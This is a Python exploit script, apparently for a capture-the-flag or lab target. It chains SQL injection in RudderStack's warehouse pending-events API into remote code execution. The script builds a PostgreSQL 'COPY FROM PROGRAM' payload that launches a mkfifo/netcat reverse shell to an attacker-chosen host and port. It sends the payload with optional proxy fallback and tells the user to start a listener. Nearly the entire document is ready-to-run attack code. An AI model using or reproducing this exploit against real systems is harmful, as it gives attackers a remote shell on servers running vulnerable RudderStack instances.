"""
Author: Aleksa Zaztezalo
Date: May 2025
Description: SQLi to RCE in Rudderstack. It get's the flag from /flag.txt.
"""

#!/usr/bin/env python3
"""
Author: Aleksa Zaztezalo
Date: May 2025
Description: SQLi to RCE in Rudderstack. It gets the flag from /flag.txt.
"""

import requests
import json
import socket
import urllib3
import sys
import argparse

# Suppress insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def send_postgres_revshell(lhost, lport):
    """
    Creates a PostgreSQL reverse shell SQLi payload for the RudderStack API
    
    Args:
        lhost (str): The attacker's IP address for the reverse shell
        lport (int): The attacker's port for the reverse shell
    """
  
    # Create the reverse shell payload
    rev_shell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
    
    # Craft the SQL injection payload
    return f"'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM '{rev_shell}'; --"


def send_rudderstack_request(endpoint_url, source_id, proxy_url=None, task_run_id="1", direct_fallback=True, debug=False):
    """
    Send a request to RudderStack through a Burp proxy with fallback options.
    
    Args:
        endpoint_url (str): The RudderStack endpoint URL (e.g., 'rudderstack:8080/v1/warehouse/pending-events?triggerUpload=true')
        source_id (str): The source ID to use in the request payload
        proxy_url (str, optional): The Burp proxy URL (e.g., 'http://127.0.0.1:8080'). Default is None.
        task_run_id (str, optional): The task run ID. Default is "1".
        direct_fallback (bool, optional): Whether to try a direct connection if proxy fails. Default is True.
        debug (bool, optional): Whether to print debug information. Default is False.
        
    Returns:
        requests.Response: The response from the server or None if all attempts fail
    """
    # Extract host and port from endpoint_url for potential DNS/connectivity testing
    url_parts = endpoint_url.split('://')[-1].split('/')
    host = url_parts[0].split(':')[0]
    port = 80
    if ':' in url_parts[0]:
        port = int(url_parts[0].split(':')[1])

    endpoint_url = endpoint_url + "/v1/warehouse/pending-events?triggerUpload=true"
    
    # Ensure the URL has the proper protocol
    if not endpoint_url.startswith(('http://', 'https://')):
        endpoint_url = f"http://{endpoint_url}/v1/warehouse/pending-events?triggerUpload=true"
    
    # Prepare headers
    headers = {
        'Accept-Language': 'en-US,en;q=0.9',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'application/json',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json'
    }
    
    # Prepare payload
    payload = {
        "source_id": f"{source_id}",
        "task_run_id": task_run_id
    }
    
    json_payload = json.dumps(payload)
    headers['Content-Length'] = str(len(json_payload))
    
    if debug:
        print(f"Debug: Target host: {host}, port: {port}")
        print(f"Debug: Payload: {json_payload}")
    
    # Check if target is reachable first
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((host, port))
        s.close()
        if debug:
            print(f"Debug: Target {host}:{port} is reachable")
    except Exception as e:
        print(f"Warning: Target {host}:{port} is not directly reachable: {str(e)}")
        print("If the target is in a different network or container, this test may fail even if proxy access works")
    
    # Setup proxy configuration if provided
    proxies = None
    if proxy_url:
        # Add http:// prefix if not present
        if not proxy_url.startswith(('http://', 'https://')):
            proxy_url = f"http://{proxy_url}" 
            
        proxies = {
            'http': proxy_url,
            'https': proxy_url
        }
        
        # Test proxy connectivity if debug is enabled
        if debug:
            proxy_host = proxy_url.split('://')[-1].split(':')[0]
            try:
                proxy_port = int(proxy_url.split(':')[-1])
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((proxy_host, proxy_port))
                    s.close()
                    print(f"Debug: Proxy {proxy_host}:{proxy_port} is reachable")
                except Exception as e:
                    print(f"Warning: Proxy {proxy_host}:{proxy_port} is not reachable: {str(e)}")
            except ValueError:
                print(f"Warning: Could not parse proxy port from {proxy_url}")
    
    # Try with proxy first (if provided)
    if proxy_url:
        try:
            if debug:
                print(f"Debug: Attempting request through proxy {proxy_url}")
            
            response = requests.post(
                endpoint_url,
                headers=headers,
                data=json_payload,
                proxies=proxies,
                verify=False,
                timeout=10
            )
        
            return response
            
        except requests.exceptions.ProxyError as e:
            print(f"Proxy Error: {str(e)}")
            if not direct_fallback:
                raise
            print("Attempting direct connection as fallback...")
        
        except Exception as e:
            print(f"Error with proxy request: {str(e)}")
            if not direct_fallback:
                raise
            print("Attempting direct connection as fallback...")
    
    # Try direct connection (either as primary method or fallback)
    if not proxy_url or direct_fallback:
        try:
            if debug:
                print("Debug: Attempting direct request without proxy")
                
            response = requests.post(
                endpoint_url,
                headers=headers,
                data=json_payload,
                verify=False,
                timeout=10
            )
            
 
            return response
            
        except Exception as e:
            print(f"Error with direct request: {str(e)}")
            raise
    
    return None

def main():
    # Create argument parser
    parser = argparse.ArgumentParser(description='SQLi to RCE in Rudderstack')
    
    # Add arguments
    parser.add_argument('-u', '--url', type=str, default="rudderstack:8080/v1/warehouse/pending-events?triggerUpload=true", 
                        help='RudderStack endpoint URL (default: rudderstack:8080/v1/warehouse/pending-events?triggerUpload=true)')
    parser.add_argument('-lh', '--lhost', type=str, required=True,
                        help='Your IP address for the reverse shell')
    parser.add_argument('-lp', '--lport', type=str, required=True,
                        help='Your port for the reverse shell')
    parser.add_argument('-p', '--proxy', type=str,
                        help='Proxy URL (e.g., 127.0.0.1:8080)')
    parser.add_argument('-d', '--debug', action='store_true',
                        help='Enable debug output')
    parser.add_argument('-nf', '--no-fallback', action='store_true',
                        help='Disable fallback to direct connection if proxy fails')
    parser.add_argument('-t', '--task-id', type=str, default="1",
                        help='Task run ID (default: 1)')
    
    # Parse arguments
    args = parser.parse_args()
    
    # Create the SQL injection payload
    source_id = send_postgres_revshell(args.lhost, args.lport)
    
    print(f"[*] Setting up reverse shell to {args.lhost}:{args.lport}")
    print(f"[*] Make sure you have a listener running with: nc -lvnp {args.lport}")
    
    try:
        # Send the request
        print(f"[*] Sending request to {args.url}")
        if args.proxy:
            print(f"[*] Using proxy: {args.proxy}")
        
        response = send_rudderstack_request(
            args.url,
            source_id,
            proxy_url=args.proxy,
            task_run_id=args.task_id,
            direct_fallback=not args.no_fallback,
            debug=args.debug
        )
        
        print("[*] Request sent successfully")
        print("[*] If the target is vulnerable, you should receive a reverse shell connection")
        print("[*] Check your listener!")
        
    except Exception as e:
        print(f"[!] Fatal error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()